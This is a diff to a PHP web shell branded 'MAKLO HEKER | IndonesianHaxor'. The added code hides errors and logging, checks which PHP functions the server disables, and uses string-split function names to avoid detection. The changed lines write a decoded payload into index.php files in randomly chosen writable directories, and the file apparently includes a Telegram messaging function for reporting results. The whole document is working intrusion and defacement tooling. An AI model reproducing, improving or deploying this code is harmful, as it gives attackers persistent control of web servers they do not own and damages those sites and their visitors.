@@ -15,6 +15,11 @@
 	<link rel="icon" href="https://i.imgur.com/Be4uoSM.png" type="image/x-icon">
 </head>
 <body bgcolor="#1f1f1f" text="#ffffff">
+	    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Carrois+Gothic&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Bungee+Outline&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <style>
 	@import url('https://fonts.googleapis.com/css?family=Dosis');
@@ -144,6 +149,26 @@ echo '<font face="Bungee" size="6">Ano' .
 <tr><td>';
 set_time_limit(0);
 error_reporting(0);
+set_time_limit(0);
+@clearstatcache();
+@ini_set("error_log", null);
+$web =
+    (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on"
+        ? "https"
+        : "http") .
+    "://" .
+    $_SERVER["HTTP_HOST"];
+$disfunc = @ini_get("disable_functions");
+if (empty($disfunc)) {
+    $disf = "<font color='lime'>AMAN</font>";
+} else {
+    $disf = "<font color='red'>" . $disfunc . "</font>";
+}
+function author()
+{
+    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2016 &copy; MAKLO HEKER | IndonesianHaxor</center></td></table><br>";
+    exit();
+}
 
 $gcw = "ge" . "tc" . "wd";
 $exp = "ex" . "plo" . "de";
@@ -1388,7 +1413,7 @@ if (isset($_GET["loknya"]) && $_GET["opsi"] == "lompat") {
         }
         $loks = sds($_POST["lo" . "kr" . "una"]);
         $pisah = $ars($loks, -50);
-        $los = $arr($pisah, 10);
+        $los = $arr($pisah, 2);
         $satu = $loks[$los[0]];
         $satut = $ftm($satu);
         $dua = $loks[$los[1]];
@@ -1400,7 +1425,7 @@ if (isset($_GET["loknya"]) && $_GET["opsi"] == "lompat") {
         if (!$isw($satu)) {
             echo "[<merah>Fa" . "il" . "ed</merah>] " . $satu . "<br>";
         } else {
-            $satus = $satu . "/ind" . "ex" . "php";
+            $satus = $satu . "/ind" . "ex" . ".php";
             $fpt(
                 $satus,
                 $h2b(
@@ -2181,3 +2206,5 @@ function sendTelegramMessage($botToken, $chatId, $message)
 
 
 
+</body>
+</html>
